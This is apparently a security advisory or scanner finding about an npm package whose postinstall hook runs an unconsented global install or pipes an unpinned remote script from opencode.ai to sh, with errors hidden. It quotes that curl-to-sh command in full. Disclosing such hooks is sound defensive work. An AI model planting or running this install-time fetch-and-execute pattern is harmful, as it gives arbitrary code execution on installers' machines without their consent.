summary: postinstall pipes unpinned remote shell script from opencode.ai to sh
details: scripts/postinstall.js runs automatically during `npm install` and, when an `opencode` binary is not already on PATH, executes `npm install -g @opencode/cli 2>/dev/null || curl -fsSL https://opencode.ai/install.sh 2>/dev/null | sh`. The curl fallback fetches an unpinned shell script from opencode.ai — a third-party domain not owned by this package's publisher — and pipes it directly to sh with no hash or signature verification, with stderr suppressed. Every install on a machine without a pre-existing opencode binary results in arbitrary code execution sourced from a domain outside the publisher's control; a compromise of opencode.ai (or DNS hijack) would yield code execution on every installer. The same block also attempts an unconsented global install of @opencode/cli, an unrelated third-party CLI, system-wide.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
